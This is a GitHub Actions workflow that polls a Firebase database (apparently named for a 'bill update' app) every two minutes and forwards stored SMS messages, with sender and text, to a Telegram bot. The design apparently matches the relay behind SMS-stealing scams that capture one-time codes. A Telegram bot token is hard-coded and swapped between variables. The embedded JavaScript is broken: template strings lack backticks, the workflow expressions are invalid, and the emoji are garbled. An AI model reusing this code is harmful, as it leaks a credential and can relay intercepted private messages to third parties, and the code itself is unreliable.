name: SMS to Telegram Forwarder

on:
  schedule:
    - cron: '*/2 * * * *'
  workflow_dispatch:

jobs:
  check-and-forward:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm install axios

      - name: Check SMS and send notification
        env:
          FIREBASE_URL: 'https://billupdate-2c426-default-rtdb.asia-southeast1.firebasedatabase.app'
          BOT_TOKEN: ${{ 8194289567 }}
          CHAT_ID: ${{ 8201318151:AAGelxS1S7B9Zj9Ck9qd5UeK8Kv0573I18Y }}
        run: |
          cat > forwarder.js << 'EOF'
          const axios = require('axios');
          const FIREBASE_URL = process.env.FIREBASE_URL;
          const BOT_TOKEN = process.env.BOT_TOKEN;
          const CHAT_ID = process.env.CHAT_ID;

          console.log('ðŸš€ Starting SMS forwarder...');

          async function main() {
            try {
              const queryUrl = ${FIREBASE_URL}/messages/messages.json?orderBy="telegram_sent"&equalTo=null;
              console.log('ðŸ” Checking Firebase at:', queryUrl);

              const fbResponse = await axios.get(queryUrl);
              const messages = fbResponse.data;

              if (!messages || Object.keys(messages).length === 0) {
                console.log('ðŸ“­ No new messages found.');
                return;
              }

              console.log(âœ… Found ${Object.keys(messages).length} new message(s).);

              for (const [msgId, msgData] of Object.entries(messages)) {
                console.log(\nðŸ“± Processing SMS ID: ${msgId});
                
                // ðŸ” KEY FIX: The emoji text is INSIDE this JavaScript string.
                const telegramMsg = `
ðŸ”” *NEW SMS ALERT* ðŸ””

ðŸ“ž *From:* ${msgData.sender || 'Unknown'}
ðŸ“ *Message:* ${msgData.message || 'No content'}
â° *Time:* ${new Date(msgData.timestamp || Date.now()).toLocaleString('en-IN')}
ðŸ†” *Database ID:* \${msgId}\
                `.trim();

                try {
                  console.log('   ðŸ“¤ Sending to Telegram...');
                  const tgResponse = await axios.post(
                    https://api.telegram.org/bot${BOT_TOKEN}/sendMessage,
                    {
                      chat_id: CHAT_ID,
                      text: telegramMsg,
                      parse_mode: 'Markdown'
                    }
                  );
                  console.log(`   âœ… Telegram message sent.`);

                  const updateUrl = ${FIREBASE_URL}/messages/messages/${msgId}.json;
                  await axios.patch(updateUrl, {
                    telegram_sent: true,
                    sent_at: Date.now(),
                    sent_via: 'github_actions'
                  });
                  console.log(`   âœ… Updated Firebase.`);

                } catch (err) {
                  console.error(`   âŒ Error:`, err.message);
                }
              }

            } catch (error) {
              console.error('ðŸ”¥ CRITICAL ERROR:');
              console.error('Message:', error.message);
              if (error.response) {
                console.error('Response Data:', error.response.data);
              }
              process.exit(1);
            }
          }

          main();
          EOF

          node forwarder.js
